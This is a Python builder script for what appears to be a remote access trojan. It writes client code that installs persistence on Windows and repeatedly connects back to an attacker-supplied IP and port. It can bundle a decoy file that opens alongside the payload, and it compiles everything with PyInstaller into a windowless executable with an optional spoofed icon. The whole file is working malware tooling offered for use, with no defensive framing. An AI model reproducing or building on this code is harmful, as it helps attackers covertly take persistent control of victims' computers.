import argparse
import subprocess
import time

ap = argparse.ArgumentParser()
ap.add_argument("-ip", "--ip_address", required=True, help="Enter the IP address to connect server.")
ap.add_argument("-p", "--port", required=True, help="Enter the port number to connect the server.")
ap.add_argument("-i", "--icon", required=False, help="Set the icon if you want.")
ap.add_argument("-f", "--open_added", required=False, help="Set the combine file if you want.")
args = vars(ap.parse_args())
if args["open_added"]:
    client_code = f"""


def try_connection():
    while True:
        time.sleep(5)
        try:
            client = Client("{args['ip_address']}", {int(args["port"])})
            client.client_main()
        except Exception:
            try_connection()

def open_combined_file():
    added_file = sys._MEIPASS + "\\\{args['open_added']}" 
    subprocess.Popen(added_file, shell=True)


open_combined_file()
if os.name == "nt":
    get_persistence()
try_connection()


"""

else:
    client_code = f"""


def try_connection():
    while True:
        time.sleep(5)
        try:
            client = Client("{args['ip_address']}", {int(args["port"])})
            client.client_main()
        except Exception:
            try_connection()


if os.name == "nt":
    get_persistence()
try_connection()

"""

with open("client.py", "a") as file:
    file.write(client_code)
if args["icon"] and args["open_added"]:
    command = f"""pyinstaller --onefile --noconsole --icon {args['icon']} --add-data "{args['open_added']};." -w client.py """
    subprocess.call(command)
    time.sleep(2)
    exit()
elif args["icon"]:
    command = f"""pyinstaller --onefile --noconsole --icon {args['icon']} -w client.py """
    subprocess.call(command)
    time.sleep(2)
    exit()
elif args["open_added"]:
    command = f"""pyinstaller --onefile --noconsole --add-data "{args['open_added']};." -w client.py """
    subprocess.call(command)
    time.sleep(2)
    exit()
else:
    subprocess.call(["pyinstaller", "--onefile", "--noconsole", "-w", "client.py"])
    time.sleep(2)
    exit()
